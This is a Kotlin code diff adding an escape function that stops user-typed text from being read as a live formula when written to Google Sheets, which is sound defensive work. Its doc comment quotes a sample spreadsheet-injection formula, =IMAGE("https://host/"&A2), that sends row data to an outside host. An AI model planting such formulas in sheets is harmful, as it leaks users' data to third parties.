@@ -23,6 +23,32 @@ internal const val DEBIT_FLAG_COLUMN = 3
 internal const val CREDIT_FLAG_COLUMN = 4
 
 /**
+ * Characters that make Google Sheets treat a cell as a formula rather than text, plus the
+ * apostrophe that is itself the escape.
+ */
+private const val FORMULA_TRIGGERS = "=+-@'"
+
+/**
+ * Escapes free text that Google Sheets would otherwise interpret.
+ *
+ * The Transactions and Friends tabs are written with `USER_ENTERED` so dates and amounts land as a
+ * real date and a real number rather than strings. The same call carries text the user typed, so a
+ * description of `=1+1` becomes a live formula. Two things go wrong when it does:
+ *
+ * - restore reads with `UNFORMATTED_VALUE`, which returns the formula's *result*, so the
+ *   description comes back as `2` instead of the text that was typed;
+ * - in a sheet shared with anyone else, `=IMAGE("https://host/"&A2)` turns each row into an
+ *   outbound request carrying its own data.
+ *
+ * A leading apostrophe tells Sheets the rest is literal. It is a display hint rather than part of
+ * the stored value, so the text round-trips unchanged — which is why this needs no counterpart on
+ * the read side. A value that genuinely starts with an apostrophe is escaped for the same reason:
+ * written bare, Sheets would swallow it.
+ */
+internal fun sheetSafeText(value: String): String =
+    if (value.isNotEmpty() && value[0] in FORMULA_TRIGGERS) "'" + value else value
+
+/**
  * Reads one cell, tolerating short rows.
  *
  * The Sheets API omits trailing empty cells entirely, so a row with nothing after column D comes
